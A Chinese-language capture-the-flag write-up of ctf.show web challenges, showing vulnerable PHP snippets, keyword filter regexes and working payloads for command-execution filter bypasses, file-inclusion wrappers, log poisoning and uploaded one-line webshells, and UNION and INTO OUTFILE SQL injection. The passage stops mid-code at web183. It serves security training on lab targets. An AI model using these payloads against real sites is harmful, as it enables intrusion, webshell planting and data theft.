# Web入门

**Web方向主打的就是一个经验积累。**

## 命令执行

**贴出的源代码均已去掉注释，太影响排版了**

### web29

命令执行，需要严格的过滤

贴上网站源代码

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

原理分析：获得一个名为”c“的GET请求，若这个请求中没有”flag“字样，则将这个GET请求当作一段PHP命令直接执行。

首先考虑扫一下目录，发现了一个flag.php可以直接访问，然而网站的过滤不允许。

先构建?c=phpinfo();调出了php介绍页面，发现PHP版本为7.3.11。同时服务器使用的是linux系统。这里没有找到flag。

先考虑使用system函数实现命令的执行，构造?c=system("ls");作为测试，发现成功了，网站给出可执行的文件分别为index.php和flag.php，其中默认显示的为index.php。

对于flag.php的访问，可以考虑使用f*，或者在linux系统下插入’‘，”“，\ ("\ "可能会被浏览器强行改为/，小心)来实现绕过。

接下来尝试使用?c=echo `tac f""lag.php`;成功得到flag

参考payload:?c=echo `tac f""lag.php`;

#### web29更好的解法

如果选择将flag.php内容先复制到另一个文件里，然后再直接访问这个文件，可以得到一个排版更好的内容。

参考payload:?c=echo `cp f* 1.txt`;然后直接访问1.txt即可。





### web30

命令执行，需要严格的过滤

本次flag、system和php被过滤了。

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

说明执行系统命令得使用其他的替代品，比如说echo ``，passthru等。

以**web29更好的解法**同样的原理，构造?c=echo `cp f* 1.txt`;然后直接访问1.txt即可得到flag

或者说，也可以?c=echo `tac f""lag.p""hp`;

不上图了，跟web29差不多。



### web31

这一次增加了cat,sort,shell,'.'和空格的过滤

**空格可以用tab代替，输入其URL编码%09，'.'同理**

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```

payload：?c=echo%09`tac%09f*`;

直接出答案，或者**复制后再访问**的思路也可以，但攻防的时候这样干确定不会被蓝队抓个正着吗？

同时如果复制的文件不写扩展名，需要下载下来用记事本查看。



### web32

很好，这次额外禁用了echo，内联和分号还有引号。看来**传统的命令执行是不行了**。

目前各位师傅的wp里面写的是文件包含，但用这个方法的话我要下一个专题有何用？

因此这里有一位师傅给出了回答：等后来学会了文件包含再来做这个。

payload：?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

这样可以利用伪协议得到flag.php的base64编码，前面的部分先闭合了上一个函数进行**逃逸**并将舞台留给伪协议。

```
<?php

error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web33

这次双引号被过滤了，还是得逃逸外加文件包含。

payload:?c=include%09$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php

payload:?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web34

放上源码

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

需要一个名称为“c”的GET请求，通过正则匹配的判断后即可执行命令

目前可用的执行函数有：passthru()

目前可用的读取函数有：tac, more, less, tail

空格和分号均被过滤了。

尝试逃逸加文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

成功，拿到flag。



### web35

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

同web34进行逃逸和文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



### web36

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

他这次把数字给禁用了

?c=include%09$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php



### web37

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

文件包含，由于过滤了flag，不能用php协议，所以用data://text/plain解决，绕开过滤用正则

?c=data://text/plain,<?php system("tac f*");?>

得到flag



### web38

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

增加了对php的过滤，然而没什么用

?c=data://text/plain,<?=system("tac f*");?>



### web39

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

收到一个名为c的GET请求，然后如果里面没有flag，那就给它后面加个.php包含它,其实如果结尾闭合了可以不管这个尾巴。

payload:

?c=data://text/plain,<?=system("tac%20f*");?>



### web40

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

搁这全武行呢？过滤了数字，~，`，@，#，$，%，^，&，*，()，-，=，+，{}，[]……

个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));

什么嘛，那是中文括号，吓我一跳。



### web41

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

POST请求，上bp

本题给出了一个脚本，可用于从ASCII中从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。

用那个脚本即可得到结果，与此同时，如果以后还有**没有过滤或运算**的命令执行时，均可以用它来生成可执行结果并跑出结果。

![](.\命令执行\web41.png)

脚本已同步于Github的script仓库中。



### web42

> 关于shell的重定向命令
>
> 标准输入，值为0，从磁盘获得输入
>
> 标准输出，值为1，输出到屏幕
>
> 错误输出，值为2，输出到屏幕
>
> 对应着/proc/self/fd/**x**，**x**为上面对应的值

现在看题，重点在于> /dev/null 2>&1

/dev/null为linux系统回收站，数据会被直接丢弃

2>&1则是将错误输出重定向到标准输出，如此一来便不会回显到显示器上。

所以采用命令把flag打印出来，利用；分隔分化一下命令，如此便能使其回显出来。

本题中输入?c=ls;ls，显示文件目录

?c=tac flag.php;ls，拿到flag



### web43

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次不许有分号，也不许有cat。tac不受影响，分号的分化分割作用可以用||代替。

payload:?c=tac flag.php ||



### web44

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

新增对flag的过滤，那就先正则匹配

payload:?c=tac f* ||



### web45

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次加了一个空格。空格可以用url编码的TAB代替，即%09

payload:?c=tac%09f*||



### web46

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次增加了对数字,$和*的过滤。

payload:?c=tac%09fla''g.php||



### web47

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

啊这……tac无所畏惧

payload:?c=tac%09fl''ag.php||



### web48

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

小老弟你怎么回事？

payload:?c=tac%09fl''ag.php||



### web49

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:?c=tac%09fl''ag.php||

这tac是犯了天条吗？几乎没见着过滤它的。



### web50

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次原先的payload终于没用了，好耶！

然后发现tac依旧坚挺，倒下的是%09，尝试使用%0C取代，不行，换<试试？行了

payload:?c=tac<fla''g.php||



### web51

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

无敌的tac倒下了，但是<没有倒下，||也没有倒下！

payload:?c=nl<fl''ag.php||

成功自行构造出官解，然而记得看源代码，这题没有回显。



### web52

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次<被过滤了。

        cat${IFS}flag.txt
        cat$IFS$9flag.txt
        cat<flag.txt
        cat<>flag.txt
        ca\t fl\ag
        kg=$ '\x20flag.txt' &&cat$kg
        (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
来来来，百科全书，上

payload：?c=nl$IFS/fl%27%27ag||

为什么不要php，没搞懂。



### web53

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

<br>空标签，意味着换行。也就是说会出现原指令的名字。

?c=ls查看发现有flag.php和readflag？

都尝试打开试试

?c=t''ac${IFS}fla''g.p''hp



### web54

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat 命令了。

空格依旧用${IFS}代替。先ls查看一下，发现目标文件flag.php

然后构建查看flag.php的payload：?c=/bin/?at${IFS}f???????

请注意，它只是执行了但没有回显结果，需要自己看源代码



### web55

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

但因为字母不能传入，我们需要使用通配符?来进行代替

?c=/bin/base64 flag.php

替换后变成

?c=/???/????64 ????.???

谜语人滚出CTF！

还真的得到了base64编码，但这种纯靠猜的题目建议扔秦岭喂大熊猫



### web56(未完成)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

它这次把数字也过滤了……



## 文件包含

文件包含系列开始

### web78

网站源码为：

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

没有任何的过滤

可见对于一个名为“file”的GET请求，会以include的形式去执行，那这个地方尝试使用php伪协议

payload：?file=php://filter/convert.base64-encode/resource=flag.php

再一次获得flag.php的base64编码

解码即可得到flag



### web79

这一次出现了过滤，会将php自动转换为 ???从而使php伪协议失效

换别的协议吧，比如说data://,file://。

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

构造payload:?file=data://text/plain,<?=system('tac flag*');?>

原理：利用data协议直接让其执行命令。



### web80

这一次的过滤有php和data，那就只能用别的伪协议了，压缩的那几个肯定不用了。那只剩一个file了。

但是**file只能够读取本地文件**，我要它有何用啊？

说明这里根本就不是绕过关键词，而是绕过过滤。

思路，更改大小写来绕过。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP://input,然后需要构建POST请求。此处使用到BurpSuite，

构建<?php system("ls");?>输入即可得到文件遍历目录。

这个网站里面有fl0g.php index.php两个文件，当然我们不能直接访问得到。

那就再来一次。

payload:?file=PHP://input，POST：<? php system("tac f*");?>

这次得到了flag



### web81

吊毛，这次把冒号过滤掉了，那就用url编码%3A代替。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  $file = str_replace(":", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP%3A//input,POST:<?php system("ls");?>

然后冒号被过滤了……说明php://input失效了

但还有日志可以用，?file=/var/log/nginx/access.log，发现它读取了很多的UA

那就在UA里面做手脚。抓包，UA插一句话木马，然后对着这个文件用AntSword，刀它！

在/var/www/html/fl0g.php中发现了flag

![](.\文件包含\图片\web81.png)



### web82

文件包含

**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

嗯？竞争环境？

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

好吧，php和data被锁了，冒号和点号被封了。这下后门都上不了了。

根据题目提示，使用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含。

然而这题得熬夜做……今天就算了。







## php特性

## 文件上传

### web151

前台校验不可靠

那就改前端，按F12打开控制台。找到前端检查文件格式的地方，发现可以更改例外情况，那就把png改为php，上传一句话木马，然后AntSword连接即可。

![前端弱点](.\文件上传\web151\找到前端弱点.png)

在/var/www/html中找到flag.php，打开它得到flag。

![发现flag](.\文件上传\web151\得到flag.png)



### web152

后端不能单一校验

开局和web151一样的操作，先改前端使其能够上传php文件，然后发现它拒绝了，看来文件类型被人发现不对头了。

加个头试试？还是不合规。

那改变文件类型试试？想多了，文件类型改了就失效了。

看来必须得上传一个图片。

使用bp抓包，先将一句话木马改为png格式成功上传，抓包成功后然后修改回php的后缀解析在放包。

AntSword连接，成功

在/var/www/html里面找到了藏有flag的flag.php文件

![web152](.\文件上传\web152.png)



### web153（未完成）

## SQL注入

> 手动注入基本步骤：所有语句末尾接%23
>
> 1. 查询闭合条件:  空格/单引号/两个单引号…… ，测试到再度正常为止
> 2. 测试字段数：闭合 order by，查到异常到再度正常为止
> 3. 查回显字段：闭合 union select 所有段 查看结果
> 4. 爆库名：回显字段替换为database()
> 5. 爆表名：回显字段替换为group_concat(schema_name)，末尾接上from information_schema.schemata
> 6. 爆字段：回显字段替换为group_concat(table_name)，末尾接上from information_schema.tables where table_schema=database()
> 7. 爆对应字段的所有列的值：回显字段替换为group_concat(column_name),末尾接上 from information_schema.columns where table_name='字段名'
> 8. 爆对应列的对应值：回显字段替换为group_concat(所有想要的列)，末尾接上from 对应字段
>
> 

### web171

使用sqlmap是没有灵魂的，你在内涵谁？

等会儿就去Github上学习sqlmap的源代码，学会了再用这个，就有灵魂了（乐）。

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

入门的sql注入 这道题目其实就是最简单的sql注入的例子，这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。

但是网页里所展示的24个用户并没有我们所需要的flag

这里主要的思路就是**用or进行截断，然后or后面跟我们所需要查询的语句**

'我们传入的语句'

首先我们给前面一个查询语句一个不可能达成的条件去截断它，即**-1'**

然后用or加上我们所要查询的 or username = 'flag'.我们语句外面还有一个引号。所以我们不要最后一个引号

最后的语句就是这样 -1' or username = 'flag

![](.\SQL注入\web171.png)

尝试使用sqlmap解决此题：

```
sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
```

想多了，别人把GET请求隔离了，专门放CSRF攻击的。



### web172

撸猫为主，要什么flag？

我就要！

进入环境，查看页面源码，发现select.js

看到查询时的url是/api/?id=

![](.\SQL注入\web172\完成注入.png)

先上手动注入流程：

1. 查看页面源码，发现select.js

   看到查询时的url是/api/?id=

   /api/?id=1' order by 3%23

   /api/?id=1' union select 1,2,3%23

   /api/?id=1' union select 1,2,database()%23

   联合查询

   /api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

   /api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23

   /api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23

   看到有3列 id,username,password

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

   查询password发现没有flag

   查另一个表 ctfshow_user2

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

   看到flag

   ![](.\SQL注入\web172\完成注入.png)



### web173

考查sql基础

api/?id= 还是一如既往，开始手动注入

1. 闭合为1’
2. order by 检查有3段
3. 三段均可显示，nice
4. 数据库名：ctfshow_web
5. 表名：information_schema,test,mysql,performance_schema,ctfshow_web
6. ctfshow_web列名：ctfshow_user,ctfshow_user2,ctfshow_user3
7. ctfshow_user行名：没有
8. ctfshow_user2行名：没有
9. ctfshow_user3行名：id,username,password
10. ?id=1' union select id,username,password from ctfshow_user3%23，得到ctfshow{48d10635-f753-4e3a-bd14-b11b924dc67c}

![](.\SQL注入\web173.png)

### web174

本题过滤了一切带有数字的值回显出来，那就只能使用replace()语法将数字全部转换成字母来进行注入了

```
0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username="flag" --+
```

但是，这样子会让flag也变成加密形式，因此需要写脚本还原

```
import base64

flag64 = "Y@CRmc@Bhvd@Cs@JYzcxYjRjYy@AmMjZkLTQ@BYjctYmU@JZS@AjYTMwMmFjZWU@EODZ@I"
flag = flag64.replace("@A", "1").replace("@B", "2").replace("@C", "3").replace("@D", "4").replace("@E", "5").replace(
    "@F", "6").replace("@G", "7").replace("@H", "8").replace("@I", "9").replace("@J", "0")

print(base64.b64decode(flag))
```

最后解码得到flag的值

![](.\SQL注入\web174\web174.png)



### web175

虽然正则匹配过滤了所有ASCII值的回显，但这并不意味着注入点不能看，毕竟无显示和异常还是有区别的。

然后关于不回显的事情，将内容输出到别的文件里访问就是了。

1. 测试发现1‘ 即可闭合代码
2. 经过order by测试，这次的数据库只有两段
3. 这都不需要测试回显了，就两行，图中有三行，怎么都显示。
4. 由于不回显，我们只能将其输出到另外的文件中查看，构造payload:1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'%23，也就是将查询的结果输出到/var/www/html/1.txt的文件中，待会儿我们访问便是。

这不就找到了吗？

![](.\SQL注入\web175.png)

### web176

从现在开始，有字符过滤了，开始学习绕过姿势。

过滤了`select`，通过大小写即可绕过 。order by检查有3行，那就开始吧。

直接构造payload:1' union SELect 1,2,3%23，很好三段均回显。

根据题目所给提示，直接

```
1' union sElect id,username,password from ctfshow_user%23
```

拿到flag

![](.\SQL注入\web176.png)

另解：万能密码'1 or 1=1%23



### web177

这次过滤了空格，/**/或者%09绕过即可。

order by试探了下只有三行，继续union select。

很好，这次没有过滤select。

那就直接把1，2，3换成id,username,password，最后接上%09from%09ctfshow_user%23

成功拿到flag。

![](.\SQL注入\web177.png)

p.s:尝试1‘%9or%091=1%23，失败……



### web178

过滤了空格和*号。

用%09绕过即可

```
1'%09union%09select%09id,username,password%09from%09ctfshow_user%23
```

完事，得到flag

再试试这个也可以

```
id=1'or'1'='1'%23
```

![](.\SQL注入\web178.png)

### web179

它这次把%09绕过了，那就用%0c代替

```
1'%0cunion%0cselect%0cid,username,password%0cfrom%0cctfshow_user%23
```

后面基本过程相似，就不放图了。

万能密码'or'1'='1'%23依旧坚挺，下道题试试看。

### web180

这次过滤了%09,%0a,%0b,%0d，用%0c绕过

通过测试发现注释符被过滤了，即–+，#，%23都不可以使用，我们换一种思路，把sql后面的‘闭合。

```
'or'1'='1'--%0c
```

或者

```
-1'%0cor%0cusername%0clike%0c'flag
```



### web181

```
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

这次过滤了空格

payload:-1'%0cor%0cusername='flag



### web182

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

不许直接访问flag

payload:-1'%0cor%0cusername%0clike%0c'f%%%



### web183

```
  function waf($str){
